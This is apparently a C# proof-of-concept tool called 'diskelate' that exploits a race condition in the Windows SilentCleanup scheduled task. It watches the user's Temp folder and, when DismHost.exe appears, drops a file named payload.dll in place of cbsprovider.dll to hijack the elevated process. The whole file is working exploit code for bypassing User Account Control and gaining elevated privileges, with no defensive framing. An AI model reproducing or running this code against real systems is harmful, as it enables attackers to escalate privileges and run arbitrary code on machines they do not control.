using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace diskelate
{
    internal class Program
    {
        public static bool exit = false;
        static void Main()
        {
            Console.WriteLine("[*] diskelate by emlinhax");

            FileSystemWatcher watcher = new FileSystemWatcher();
            watcher.Path = @"C:\Users\" + Environment.UserName + @"\AppData\Local\Temp";
            watcher.NotifyFilter = NotifyFilters.DirectoryName | NotifyFilters.LastWrite | NotifyFilters.FileName;
            watcher.Filter = "*.*";
            watcher.IncludeSubdirectories = true;
            watcher.Created += OnCreated;
            watcher.EnableRaisingEvents = true;
            Console.WriteLine("[*] file watcher created!");

            Process.Start("schtasks.exe", "/run /tn \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup");

            while (!exit)
            {

            }
        }

        private static void OnCreated(object source, FileSystemEventArgs e)
        {
            if (e.FullPath.EndsWith("DismHost.exe"))
            {
                File.Copy(Directory.GetCurrentDirectory() + "\\payload.dll", Path.GetDirectoryName(e.FullPath) + "\\cbsprovider.dll", true);
                Console.WriteLine("[+] file placed. hoping for race condition!");
                System.Threading.Thread.Sleep(2000);
                exit = true;
            }
        }
    }
}
